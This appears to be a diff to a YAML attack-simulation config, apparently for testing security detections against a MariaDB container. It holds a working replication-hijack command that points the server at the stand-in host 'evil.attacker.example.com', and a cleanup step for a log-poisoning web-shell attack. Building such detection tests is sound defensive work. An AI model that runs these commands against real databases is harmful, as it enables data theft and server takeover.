@@ -190,13 +190,15 @@ attacks:
   # T1490 — Inhibit System Recovery: replication hijack
   # Equivalent of redis SLAVEOF — point this server at an attacker-controlled
   # primary. We point at an unreachable host so no real replication occurs.
+  # Verify via SHOW SLAVE STATUS\G that Master_Host actually changed before
+  # the cleanup-reset-replication step undoes it; bare 'ERROR' would mask
+  # syntax/privilege failures as success and destroy proof of the hijack.
   - name: sql-replication-hijack
     type: sqli
     exec:
-      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "STOP SLAVE; CHANGE MASTER TO MASTER_HOST='evil.attacker.example.com', MASTER_USER='replica', MASTER_PASSWORD='x'; RESET SLAVE ALL;"]
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "STOP SLAVE; CHANGE MASTER TO MASTER_HOST='evil.attacker.example.com', MASTER_USER='replica', MASTER_PASSWORD='x'; SHOW SLAVE STATUS\\G"]
     successIndicators:
-      - responseContains: "ERROR"
-      - responseContains: "Query OK"
+      - responseContains: "Master_Host: evil.attacker.example.com"
     expectedDetections: []
 
   # T1562 — Impair Defenses: log poisoning (general_log_file → /var/log)
@@ -314,6 +316,19 @@ attacks:
     successIndicators:
       - responseContains: "Query OK"
       - responseContains: "ERROR"
+    expectedDetections: []
+
+  # Restore general_log_file to its original /var/log/mysql/general.log path.
+  # The sql-log-poisoning-shell attack leaves the variable pointing at a
+  # /var/log/mysql/poisoned.php which is a dynamic GLOBAL value that persists
+  # until restart — without this cleanup a re-enabled general_log would log
+  # straight into the attacker-named file across iterations.
+  - name: cleanup-restore-general-log
+    type: sqli
+    exec:
+      command: ["mariadb", "-h", "mariadb", "-uroot", "-prootpwd", "-e", "SET GLOBAL general_log = OFF; SET GLOBAL general_log_file = '/var/log/mysql/general.log';"]
+    successIndicators:
+      - responseContains: "Query OK"
     expectedDetections: []
 
   # Clean up client-side artifacts.
